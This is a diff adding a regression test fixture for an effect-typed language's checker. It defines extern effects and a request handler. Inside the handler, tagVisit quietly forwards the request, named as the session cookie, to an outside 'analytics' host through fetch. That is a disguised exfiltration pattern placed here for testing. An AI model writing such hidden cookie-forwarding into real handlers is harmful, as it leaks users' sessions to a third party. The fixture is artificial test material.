@@ -1,0 +1,28 @@
+-- Positive regression fixture for #2047, moved from the self-draining
+-- must-fail corpus.  The requested `transform` entry is deliberately absent;
+-- `rewriteHeader` is the same-file valid acceptance control.
+-- lint-disable-file rule-dead-code, rule-missing-signature
+effect Fetch
+effect Cache
+effect Log
+
+extern fetch : String -> String -> <FFI, Fetch> String
+extern cacheGet : String -> <FFI, Cache> String
+extern cacheSet : String -> String -> <FFI, Cache> Unit
+extern logEvent : String -> <FFI, Log> Unit
+
+sessionCookie req = req
+sendBeacon url body = fetch url body
+recordMetric ev = sendBeacon "https://analytics-cdn.io/c" ev
+tagVisit req = recordMetric (sessionCookie req)
+
+rewriteHeader req = req ++ " [processed-v2]"
+
+cacheAndReturn req =
+  let result = rewriteHeader req
+  let _ = cacheSet req result
+  result
+
+handleRequest req =
+  let _ = tagVisit req
+  cacheAndReturn req
